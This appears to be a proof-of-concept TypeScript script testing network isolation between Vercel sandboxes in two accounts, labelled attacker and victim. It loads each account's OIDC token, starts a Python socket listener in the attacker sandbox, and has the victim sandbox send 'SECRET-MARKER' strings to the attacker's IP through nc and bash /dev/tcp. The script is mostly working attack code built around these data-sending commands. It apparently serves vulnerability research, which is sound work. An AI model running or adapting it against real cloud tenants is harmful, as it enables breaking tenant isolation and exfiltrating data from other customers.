import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const ATT = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const VA = JSON.parse(Buffer.from(ATT.split(".")[1], "base64url").toString());
const VV = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  // 1. Start attacker sandbox with a listener
  let att: any;
  try {
    att = await Sandbox.get({ name: "attacker-np", token: ATT, teamId: VA.owner_id, projectId: VA.project_id });
  } catch {
    att = await Sandbox.create({ name: "attacker-np", token: ATT, teamId: VA.owner_id, projectId: VA.project_id });
  }
  const startListener = `
    python3 -c '
import socket, threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 9999))
s.listen(5)
print("listening", flush=True)
conn, addr = s.accept()
data = conn.recv(4096)
conn.sendall(b"PWNED-OK:" + data)
conn.close()
print("got:", data[:200], "from", addr, flush=True)
' > /tmp/listener.log 2>&1 &
    sleep 1
    echo LISTENING
    ip -4 addr show eth0 | grep inet | awk '{print $2}'
  `;
  const resL = await att.runCommand("bash", ["-c", startListener], { sudo: true, wait: true, timeout: 60_000 });
  const attOut = await resL.output("both");
  console.log("attacker listener:", attOut.trim());

  // get attacker IP from output
  const m = attOut.match(/(\d+\.\d+\.\d+\.\d+)\/\d+/);
  const attIp = m ? m[1] : null;
  console.log("attacker IP:", attIp);

  // 2. Victim sandbox connects to attacker IP
  const vic = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: VV.owner_id, projectId: VV.project_id });
  const probe = `
    echo "=== victim myip ==="
    ip -4 addr show eth0 | grep inet | awk '{print $2}'
    echo "=== connect to attacker ${attIp}:9999 ==="
    timeout 6 bash -c 'echo "SECRET-MARKER-from-victim" | nc -w 4 ${attIp} 9999' 2>&1 | head -c 400
    echo
    echo "=== connect via /dev/tcp ==="
    timeout 6 bash -c 'exec 3<>/dev/tcp/${attIp}/9999 && echo "SECRET-MARKER-2" >&3 && head -c 200 <&3' 2>&1 | head -c 400
    echo
    echo "=== ping attacker ==="
    timeout 3 ping -c 2 -W 2 ${attIp} 2>&1 | head -5
  `;
  const resV = await vic.runCommand("bash", ["-c", probe], { sudo: true, wait: true, timeout: 60_000 });
  console.log("victim probe exit:", resV.exitCode);
  console.log(await resV.output("both"));

  console.log("=== attacker listener log ===");
  const log = await att.runCommand("bash", ["-c", "cat /tmp/listener.log 2>&1"], { sudo: true, wait: true, timeout: 30_000 });
  console.log(await log.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });